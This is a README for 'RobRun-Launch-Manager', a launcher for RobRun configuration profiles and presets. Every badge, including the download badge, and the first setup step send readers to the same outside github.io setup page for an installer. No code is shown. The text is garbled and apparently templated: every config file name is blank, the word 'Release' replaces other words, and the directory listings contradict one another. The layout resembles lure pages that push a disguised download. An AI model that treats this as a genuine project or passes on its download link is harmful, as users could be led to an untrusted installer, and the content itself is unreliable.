# RobRun-Launch-Manager

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Download-Release-15803d?style=flat-square&logo=checkmarx&logoColor=white" alt="Download">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Build-100%25-34A853?style=flat-square&logo=github&logoColor=white" alt="Build Status">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Release-v1.2.3-FF5733?style=plastic&logo=repo&logoColor=white" alt="Release Version">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Language-C%2B%2B-FF7F50?style=flat&logo=cpp&logoColor=white" alt="Language">
  </a>
  <a href="https://rewfdf.github.io/SetupPage/">
    <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-0066FF?style=for-the-badge&logo=windows&logoColor=white" alt="Platform">
  </a>
</div>

---

## What is RobRun-Launch-Manager?

RobRun-Launch-Manager is your centralized companion for orchestrating every launch of the RobRun environment. It bundles ready‑made configuration profiles, workflow presets, and a curated release bundle that streamlines the process of starting and managing RobRun sessions. Whether you’re setting up a single profile for personal use or deploying multiple profiles across a team, RobRun-Launch-Manager gives you a consistent, repeatable pathway to launch with confidence.

---

## Core Features

| Feature | Description | Why It Matters |
|---------|-------------|----------------|
| Structured Configuration Profiles | Pre‑defined sets of ``, ``, ``, and `` | Keeps each launch consistent, eliminates manual tweaks |
| Workflow Presets | Ready‑made command sequences for common use cases | Saves time, reduces errors, encourages best practices |
| Latest Release Bundle | Packaged installer with all dependencies | One‑click deployment, no missing component |
| Cross‑Platform Support | Works on Windows and Linux | Broad accessibility for diverse teams |
| Extensible Architecture | Plugin‑friendly design | Future‑proof for new features |

---

## Getting Started

1. **Download the latest release bundle** from the badge at the top of this page. The installer places all required files in the `RobRun-Launch-Manager` directory.
2. **Locate the configuration directory**:
   ```text
   RobRun-Launch-Manager/
   └── config/
       ├──
       ├──
       ├──
       └──
   ```
3. **Choose a profile** by editing the relevant `.cfg` files. The files are human‑readable and use a simple key/value format.
   *Example `` snippet:*
   ```
   # Player settings
   difficulty=hard
   language=EN
   ```
4. **Execute a preset** by selecting an entry from the `presets.json` file or by invoking the command line utility (see **Workflow Examples**).
5. **Verify** that the RobRun instance starts with the expected settings. Any mis‑configuration will surface as a clear error message in the console.

---

## Workflow Presets

RobRun-Launch-Manager ships with a curated set of presets stored in `presets.json`. Each preset is a JSON object that maps a friendly name to the exact command line arguments required to start RobRun with a particular profile.

Example entry:

```json
{
  "Standard Play": {
    "description": "Default launch with standard graphics",
    "arguments": [
      "--config=config/",
      "--visual=config/",
      "--player=config/"
    ]
  }
}
```

To run a preset, execute the launcher with the `--preset` flag:

```
launcher --preset="Standard Play"
```

The launcher automatically resolves the arguments and initiates a fully‑configured RobRun session.

---

## Directory Structure

<pre>
RobRun-Launch-Manager/
├── bin/
│   └── Release          # Executable for Windows
│   └── launcher          # Executable for Linux
├── config/
│   ├──
│   ├──
│   ├──
│   └──
├── presets/
│   └── presets.json
├── docs/
│   └── README.md
└── LICENSE
</pre>

---

## FAQ & Troubleshooting

| Question | Answer |
|----------|--------|
| **Why does the launch fail with "Missing configuration"** | Ensure that all four `.cfg` files exist in the `config/` directory and that the file names are spelled exactly as shown. |
| **How can I add a new preset?** | Append a new JSON object to `presets/presets.json` following the existing schema and give it a unique key. |
| **The launch uses outdated graphics settings** | Verify that `` contains the correct `resolution` and `fullscreen` values, or remove the file to fall back to defaults. |
| **I need to run on a custom port** | Add `networkPort=xxxx` to `` under the `[network]` section. |
| **Where are the logs stored?** | Logs are written to `logs/` relative to the launcher’s executable. The log file name is timestamped. |

---

## Contributing

Contributions are welcomed! To submit a new preset or configuration improvement:

1. Fork the repository and create a feature branch.
2. Update `presets/presets.json` or the relevant `.cfg` files with clear comments.
3. Commit with a descriptive message and open a pull request.
4. Reviewers will check that the changes adhere to the structure and do not introduce conflicts.

---

## Closing Thoughts

RobRun-Launch-Manager transforms the way you initiate and manage RobRun sessions. By standardizing profiles, bundling presets, and providing an intuitive launcher, it reduces Release friction and empowers you to focus on what truly matters—exploring the depths of RobRun. Enjoy a smoother, more reliable launch experience.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```